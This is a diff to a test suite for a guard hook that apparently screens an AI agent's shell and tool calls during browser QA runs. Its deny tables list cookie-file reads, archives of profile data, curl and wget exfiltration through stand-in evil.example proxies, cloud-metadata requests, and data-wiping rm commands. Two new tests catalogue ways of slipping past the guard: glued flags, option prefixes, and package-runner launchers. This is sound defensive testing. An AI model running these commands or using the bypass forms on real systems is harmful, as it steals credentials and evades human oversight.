@@ -264,11 +264,14 @@ class R3Secrets(Case):
                  'cat "${HOME}/.local/share/qa-sdet/profiles/main/Default/Cookies"', "tar c ~/.local/share/qa-sdet",
                  "grep -r sid ~/.local/share", f"cp -r {rel} .", f"ln -s {D} /tmp/q", f"ln -sf -t /tmp {D}", f"git -C {D} add -A",
                  f"cd {D} && git init && git add .", "cd ~/.local/share && git add qa-sdet",
-                 f"python3 -c \"open(__import__('os').path.expanduser('{rel}/Default/Cookies'))\""]
+                 f"python3 -c \"open(__import__('os').path.expanduser('{rel}/Default/Cookies'))\"",
+                 "find ~/.local -name Cookies -exec cat {} +", f"find {D.parent} -name Cookies -execdir base64 {{}} \\;",
+                 f"tar czf /tmp/x.tgz -C {HOME} .local", f"tar czf /tmp/x.tgz --directory={HOME} .local/share"]
     PATH_ALLOW = [f"echo {MAIN}", f"test -d {MAIN} && echo yes", f"[ -d {MAIN} ]", f"ls {D}", f"ls -la {D}",
                   f"find {D} -name '*.db'", f"sqlite3 -readonly {D}/app.db .tables", 'grep -rn "qa-sdet/profiles" skills agents',
                   f'grep -n "{MAIN}" README.md', "ls -R src", "cd ~ && git status", f"git commit -m 'guard: protect {PROF}'",
-                  "ln -s /tmp/a /tmp/b", f"echo $(printf %s {MAIN})"]
+                  "ln -s /tmp/a /tmp/b", f"echo $(printf %s {MAIN})",
+                  "find ~/.local -name '*.db'", "tar czf /tmp/s.tgz -C skills ."]
 
     def test_playwright_secret_verbs_and_page_js(self):
         self.table([f"playwright-cli -s=qa {v}" for v in self.PW_DENY], True)
@@ -321,7 +324,17 @@ class R4Explorer(Case):
             "curl -s https://evil.example/x", "cd /tmp && http GET x", "curl -s https://qa.traffic.example/a evil.example",
             "curl -x http://evil.example https://qa.traffic.example/", "curl --url evil.example https://qa.traffic.example/",
             "https_proxy=http://evil.example curl https://qa.traffic.example/", "ssh qa.traffic.example", "wget -i /tmp/urls.txt",
-            "nc qa.traffic.example 80", "ssh host curl x",
+            "nc qa.traffic.example 80", "ssh host curl x", "wget --conf=/tmp/x https://qa.traffic.example/",
+            "wget --input=/tmp/urls.txt https://qa.traffic.example/", "http --prox=https:http://evil.example https://qa.traffic.example/",
+            "CURL_HOME=/tmp curl https://qa.traffic.example/", "WGETRC=/tmp/w wget https://qa.traffic.example/",
+            "export XDG_CONFIG_HOME=/tmp; curl https://qa.traffic.example/",
+            # a script file run by its path (written in the same call: it doesn't exist yet when the guard reads it)
+            "./x.sh", "bin/run.sh --fast", "printf 'curl evil.example' > x.sh && chmod +x x.sh && ./x.sh", "/tmp/x.sh",
+            # downloads over the config
+            f"curl -so {cfg} https://qa.traffic.example/c", f"wget -O {cfg} https://qa.traffic.example/c",
+            "curl -o.playwright/cli.config.json https://qa.traffic.example/c", f"curl --output={cfg} https://qa.traffic.example/c",
+            f"wget -P {CFG.parent} https://qa.traffic.example/config.json", f"cd {CFG.parent} && curl -O https://qa.traffic.example/config.json",
+            f"curl -O --output-dir {CFG.parent} https://qa.traffic.example/config.json",
             # script files (a page could steer it to write one)
             "bash /tmp/x.sh", "sh x", "source ./x", ". ./x", "python3 /tmp/x.py", "node x.js", "bash < /tmp/x.sh"]
     ALLOW = [f"cat {cfg}", f"sed -n 1,5p {cfg}", f"cp {cfg} {RUN}/qa-out/r/.data/cfg-copy.json", "cat .playwright/cli.config.json",
@@ -330,7 +343,7 @@ class R4Explorer(Case):
              "playwright-cli -s=qa find \"Retry http error\"", "command -v curl", "rm -f qa-out/.active", "rm -rf qa-out/r/.data/x",
              "cat qa-out/.active", "printf x>qa-out/.active", "git status", "python3 -c 'print(1)'", "python3 -m unittest discover -s tests",
              f"python3 {Q} card /x", f"python3 {Q} marker stop .", "qa-mem report qa-out/r", "echo hi | bash", "bash -c 'ls -la'",
-             "playwright-cli kill-all", "curl -s https://qa.traffic.example/api/x", "playwright-cli -s=qa --raw eval 'document.body.innerHTML'"]
+             "playwright-cli kill-all", "curl -s https://qa.traffic.example/api/x", "/usr/bin/env ls", f"{Q} card /x", "playwright-cli -s=qa --raw eval 'document.body.innerHTML'"]
 
     def test_explorer_rules(self):
         self.table(self.DENY, True, RUN, agents=(True,))
@@ -362,7 +375,8 @@ class R5DataFolder(Case):
             f"python3 -c \"open('{DB}', 'w')\"", f"rsync -a --delete /tmp/empty/ {share}/", f"tar xzf a.tgz -C {D}",
             f"unzip -o a.zip -d {D}", f"cd {D} && tar xf /tmp/a.tar", f"echo x 2>&1 >{DB}", "playwright-cli -s=qa delete-data",
             f"rm -rf ${{QA_NO_SUCH_VAR:-{D}}}", f"rm -rf {HOME}/.*", f"rm -rf {share}/qa-*", f"rm {D}/*.db", f"mv {share}/q* /tmp",
-            f"rm {share}/*/*.db", f"rm -rf {D} \\"]
+            f"rm {share}/*/*.db", f"rm -rf {D} \\", f"curl -o {DB} https://qa.traffic.example/x",
+            f"wget -qO {DB} https://qa.traffic.example/x", f"curl -sc {DB} https://qa.traffic.example/x"]
     ALLOW = ["rm -rf qa-out/form/evidence", f"sqlite3 -readonly {DB} .tables", f"find {D} -name '*.db'", f"grep -c rm {DB}",
              f"cp {DB} /tmp/backup.db", f"cd {D} && ls", "mv report.pdf ~/", "mv report.pdf ~", f"mv a b {HOME}", f"rm -f {HOME}/*.log",
              f"find {HOME} -name '*.pyc' -delete", f"grep -c '>' {D}/notes.txt", f"mv {HOME}/*.pdf /tmp/docs/", f"trash {HOME}/*.zip",
@@ -417,6 +431,9 @@ class OddForms(Case):
             "source ~/.bashrc && playwright-cli -s=qa snapshot", "source <(echo 'qa-mem marker stop .')",
             f"echo '{EVIL}' > /tmp/s.sh; bash /tmp/s.sh", f"sh -s <<'X'\nrm -rf {D}\nX", "bash <<<'qa-mem marker stop .'",
             "env -S 'acli jira workitem create'", "npx -c 'playwright-cli goto https://evil.com'", ". ~/.profile; acli jira auth status",
+            "env -iS 'acli jira workitem create'", "npx --call='playwright-cli goto https://evil.com'",
+            "bash -c -- 'playwright-cli goto https://evil.com'", "bash -c -x 'acli jira workitem create'",
+            "sh -c -o pipefail 'playwright-cli -s=qa cookie-list'",
             # O5
             f"python3 -c \"import os; os.system('{ACLI_W}')\"", f"node -e \"execSync('{EVIL}')\"", "awk 'BEGIN{system(\"acli x\")}'",
             f"python3 - <<'EOF'\nopen('{CK}')\nEOF", f"python3 -c \"open('{DB}','w')\"", "node $(which playwright-cli) goto x",
@@ -426,7 +443,10 @@ class OddForms(Case):
             "ls | xargs -I{} qa-mem card {}", f"find {D} -name Cookies -print0 | xargs -0 base64",
             # O7
             "find . -exec playwright-cli goto x \\;", f'watch "{EVIL}"', f"ssh h '{ACLI_W}'", f"firejail {ACLI_W}",
-            "npm exec -- playwright-cli goto x", "uv run qa-mem browser-open x", f'trap "rm -rf {D}" EXIT', f"tmux new -d '{ACLI_W}'",
+            "npm exec -- playwright-cli goto x", "uv run qa-mem browser-open x", "bunx @playwright/cli goto https://evil.com",
+            "pnpx @playwright/cli goto https://evil.com", "pnpm dlx @playwright/cli goto https://evil.com",
+            "yarn dlx @playwright/cli goto https://evil.com", "npm exec @playwright/cli -- goto https://evil.com",
+            "npm x @playwright/cli goto https://evil.com", f'trap "rm -rf {D}" EXIT', f"tmux new -d '{ACLI_W}'",
             "find . -exec grep \"acli jira\" {} +", f"chrt -i 0 {EVIL}", "chrt 0 bin/qa-mem browser-open https://evil.com",
             f"parallel ::: '{ACLI_W}'", f"fd --exec {ACLI_W}", f"sqlite3 /tmp/x.db \"ATTACH '{CK}' AS c\"",
             f"echo '{ACLI_W}' | chrt 0 bash", f"echo '{EVIL}' | firejail /bin/sh",  # a launcher around a shell reading the pipe
@@ -451,7 +471,7 @@ class OddForms(Case):
              "npm i -g @playwright/cli@latest", "npm view @playwright/cli version", 'gh pr create --body "acli jira workitem create"',
              "ssh host uptime", "cat > notes.md <<EOF\nacli create\nEOF", "git commit -F - <<EOF\nrun acli jira workitem create\nEOF",
              "ls ~/.local/share/qa-sdet", f"echo $(printf %s {MAIN})", "echo \"it's", 'echo "$(a "$(b "$(c "$(d "$(e)")")")")"',
-             "alias ll='ls -la'", "bash -c 'playwright-cli -s=qa snapshot'", 'p() { ls "$@"; }', "trap 'rm -f /tmp/x' EXIT; echo hi",
+             "alias ll='ls -la'", "bash -c 'playwright-cli -s=qa snapshot'", "bash -c -- 'playwright-cli -s=qa snapshot'", 'p() { ls "$@"; }', "trap 'rm -f /tmp/x' EXIT; echo hi",
              "sudo pacman -S --needed git rsync unzip tar node python", "docker run --rm img git rm cp mv tar",
              "for t in git tar unzip node bash sh; do command -v $t; done", "make test", "echo '" + "a" * 100_001 + "'",
              "sudo install -o root -m 0755 acli /usr/local/bin/acli", "mv ~/Downloads/acli ~/.local/bin/", "which qa-mem"]
@@ -685,6 +705,127 @@ class R8ApproveAndLog(Case):
                     "curl -xevil:8080 https://qa.traffic.example/api", "curl -K/tmp/cfg https://qa.traffic.example/api",
                     "curl --url=evil.example https://qa.traffic.example/api", "wget -i/tmp/urls https://qa.traffic.example/api"]:
             self.assertIsNotNone(bash(cmd, RUN, explorer=True), cmd)
+
+    def test_round1_guard_bypasses_and_races(self):
+        outside = TMP / "outside.txt"
+        outside.write_text("secret\n")
+        # 1. _filter_ok bundled grep flags and -d/--directories recurse
+        for cmd in [f"grep -iefoo {outside}", f"grep -if {outside}", f"grep -if{outside}",
+                    "grep -d recurse foo", "grep -drecurse foo", "grep --directories=recurse foo"]:
+            self.assertNotEqual(decision(cmd), "allow", cmd)
+        # 2. check_profile grep/rg pattern-stripping, glued -f, long recursive flags, PRINTERS redir/cwd
+        xdg = TMP / "xdg-data"
+        xdg_main = xdg / "qa-sdet/profiles/main"
+        xdg_main.mkdir(parents=True, exist_ok=True)
+        for cmd in [f"grep -e. {CK}", f"grep --regexp=. {CK}", f"grep -ie. {CK}", f"grep -f{CK} README.md",
+                    f"grep -r --regexp=. {D}", f"grep -d recurse x {D}", f"grep --directories=recurse x {D}",
+                    f"grep --dereference-recursive x {D}", f"rg --regexp=. {CK}", f"cp --archive {D} /tmp/bak",
+                    f"echo hi > {MAIN}/p", f"cd {MAIN} && echo hi", f"true < {CK}"]:
+            self.assertIsNotNone(bash(cmd, RUN), cmd)
+        with mock.patch.dict(os.environ, XDG_DATA_HOME=str(xdg)):
+            self.assertIsNotNone(bash(f"echo hi > {xdg_main}/p", RUN))
+            self.assertIsNotNone(bash(f"cd {xdg_main} && echo hi", RUN))
+            self.assertIsNotNone(bash(f"tar xf a.tar -C{xdg_main}", RUN))
+        # 3. unpack_dir glued -C/-d and multiple -C/-d
+        for cmd in [f"tar xf a.tar -C{D}", f"tar -xfC a.tar -C{D}", f"unzip a.zip -d{D}",
+                    f"tar xf a.tar -C /tmp -C {D}", f"unzip a.zip -d /tmp -d {D}"]:
+            self.assertIsNotNone(bash(cmd, RUN), cmd)
+        # 4. sqlite3 -- -readonly bypass
+        self.assertIsNotNone(bash(f"sqlite3 {DB} 'DELETE FROM bugs;' -- -readonly", RUN))
+        # 5. acli workitem link type delete/create
+        for cmd in ["acli jira workitem link type delete", "acli jira workitem link type create"]:
+            self.assertIsNotNone(bash(cmd, RUN), cmd)
+        self.assertIsNone(bash("acli jira workitem link type", RUN))
+        self.assertIsNone(bash("acli jira workitem link type list", RUN))
+        # 6. storage_value_read Reflect.get / getOwnPropertyDescriptor
+        for js in ["Reflect.get(window, 'localStorage')", "Object.getOwnPropertyDescriptor(window, 'localStorage')",
+                   "Reflect.get(window, 'sessionStorage')"]:
+            self.assertIsNotNone(bash(f"playwright-cli -s=qa eval \"{js}\"", RUN), js)
+        self.assertIsNone(bash("playwright-cli -s=qa eval \"document.body.innerText.includes('localStorage')\"", RUN))
+        # 7. check_mapper Glob pattern / Grep glob targeting secrets
+        cwd = project()
+        for name, tin in [("Glob", {"path": str(cwd), "pattern": ".env"}),
+                          ("Glob", {"path": str(cwd), "pattern": "**/.env*"}),
+                          ("Glob", {"path": str(HOME), "pattern": ".ssh/*"}),
+                          ("Grep", {"path": str(cwd), "glob": ".env", "pattern": "SECRET"})]:
+            self.assertIsNotNone(tool(name, MAPPER, cwd, **tin), (name, tin))
+        # 8. spend_budget race when .active is deleted before flock acquires
+        p = project(budget=10)
+        active = p / "qa-out/.active"
+        active.unlink()
+        self.assertIsNone(g.spend_budget(active, 1))
+        # 9. deeply nested JSON does not crash guard.py or denied.py
+        deep = "[" * 3000 + "]" * 3000
+        self.assertEqual(hook(deep, "guard.py"), "")
+        self.assertEqual(hook(deep, "denied.py"), "")
+        # 10. pretooluse.py and denied.py work via symlink under PYTHONSAFEPATH=1
+        link_dir = TMP / "symlink-hooks"
+        link_dir.mkdir(exist_ok=True)
+        for name in ("pretooluse.py", "denied.py"):
+            link = link_dir / name
+            if not link.exists():
+                os.symlink(ROOT / "hooks" / name, link)
+        env = {**os.environ, "PYTHONSAFEPATH": "1", "QA_SDET_CONFIG": str(CFG), "QA_SDET_DATA": str(D)}
+        r = subprocess.run([sys.executable, str(link_dir / "pretooluse.py")],
+                           input=json.dumps({"tool_name": "Bash", "cwd": str(PROJ), "tool_input": {"command": ACLI_W}}),
+                           capture_output=True, text=True, env=env)
+        self.assertEqual(r.returncode, 0, r.stderr)
+        self.assertIn('"deny"', r.stdout)
+        # 11. empty QA_SDET_CONFIG / QA_SDET_DATA do not resolve to '.'
+        r2 = subprocess.run([sys.executable, "-c",
+                             "import sys; sys.path.insert(0, 'hooks'); import guard; "
+                             "assert guard.CONFIG.name == 'config.json' and guard.DATA_DIR.endswith('qa-sdet')"],
+                            cwd=str(ROOT), env={**os.environ, "QA_SDET_CONFIG": "", "QA_SDET_DATA": ""},
+                            capture_output=True, text=True)
+        self.assertEqual(r2.returncode, 0, r2.stderr)
+
+    def test_round2_guard_prefix_target_tar_net_and_marker_bugs(self):
+        outside = TMP / "outside.txt"
+        outside.write_text("secret\n")
+        share = Path(D).parent
+        # C1: GNU long-option prefixes on grep/cp/rm
+        for cmd in [f"grep --reg=. {CK}", f"grep --rec token {D}", f"grep --deref token {D}",
+                    f"grep --dir=recurse token {D}", f"cp --rec {D} /tmp/bak", f"cp --arc {D} /tmp/bak",
+                    f"rm --rec {share}"]:
+            self.assertIsNotNone(bash(cmd, RUN), cmd)
+        for cmd in [f"grep --reg=. {outside}", f"grep --fi={outside} foo", "grep --rec secret",
+                    "grep --dir=recurse secret", "grep --deref secret", "grep --unknown-opt foo"]:
+            self.assertNotEqual(decision(cmd), "allow", cmd)
+        # H1: glued/bundled -t<dir> and --target= on cp/mv/ln
+        for cmd in [f"cp -t{D} /tmp/app.db", f"mv -t{D} /tmp/app.db", f"mv -ft{D} /tmp/app.db",
+                    f"ln -sf -t{D} /tmp/app.db", f"cp --target={D} /tmp/app.db",
+                    f"cp -r -t/tmp {share}", f"cp -rt/tmp {share}", f"ln -s -t/tmp {share}"]:
+            self.assertIsNotNone(bash(cmd, RUN), cmd)
+        for cmd in [f"cp -t{CFG.parent} /tmp/config.json", f"mv -t{CFG.parent} /tmp/config.json"]:
+            self.assertIsNotNone(bash(cmd, RUN, explorer=True), cmd)
+        # H2: tar old-style xfC/xC and GNU --dir/--ext prefixes
+        for cmd in [f"tar xfC a.tar {D}", f"tar xC {D} -f a.tar", f"tar --dir={D} -xf a.tar",
+                    f"tar --dir {D} --ext -f a.tar"]:
+            self.assertIsNotNone(bash(cmd, RUN), cmd)
+        # H3: explorer_net bare IPv4/IPv6, bundled -sK/-sx/-qi, --socks5/--proxy1.0
+        for cmd in ["curl -s 169.254.169.254/latest/meta-data/ https://qa.traffic.example/api",
+                    "curl -s [2001:db8::1]:8080/secret https://qa.traffic.example/api",
+                    "curl -sK /tmp/cfg https://qa.traffic.example/api",
+                    "curl -sK/tmp/cfg https://qa.traffic.example/api",
+                    "curl -sx10.0.0.1:8080 https://qa.traffic.example/api",
+                    "wget -qi /tmp/urls.txt https://qa.traffic.example/api",
+                    "curl --socks5=evil.com:1080 https://qa.traffic.example/api",
+                    "curl --socks5-hostname=evil.com:1080 https://qa.traffic.example/api",
+                    "curl --proxy1.0=evil.com:8080 https://qa.traffic.example/api"]:
+            self.assertIsNotNone(bash(cmd, RUN, explorer=True), cmd)
+        self.assertIsNone(bash("curl -s -dx https://qa.traffic.example/api", RUN, explorer=True))
+        # M1: guard.mask does not corrupt port + @ in query/fragment
+        self.assertEqual(g.mask("http://localhost:8765?email=qa@example.com"), "http://localhost:8765?email=qa@example.com")
+        self.assertEqual(g.mask("https://u:pw@host:8443/x"), "https://[masked]@host:8443/x")
+        # M8: huge budget integer in .active does not crash read_marker with OverflowError
+        p = project()
+        (p / "qa-out").mkdir(exist_ok=True)
+        (p / "qa-out/.active").write_text(json.dumps({"expires": time.time() + 3600, "budget": 10**400, "used": 0, "deadline": 0, "faults": False}))
+        self.assertEqual(g.read_marker(str(p)), (None, None))
+        # L5: denied.py handles NUL in cwd without crashing; guard handles deleted cwd
+        self.assertEqual(hook({"tool_name": "Bash", "cwd": "/tmp/a\x00b", "tool_input": {"command": "ls"}}, "denied.py"), "")
+        with mock.patch("os.getcwd", side_effect=FileNotFoundError("deleted")):
+            self.assertEqual(g.evaluate({"tool_name": "Bash", "tool_input": {"command": "playwright-cli -s=qa close"}})[0], None)
 
     def test_hook_prints_allow_deny_or_nothing(self):
         out = lambda cmd: hook({"tool_name": "Bash", "cwd": str(RUN), "tool_input": {"command": cmd}})
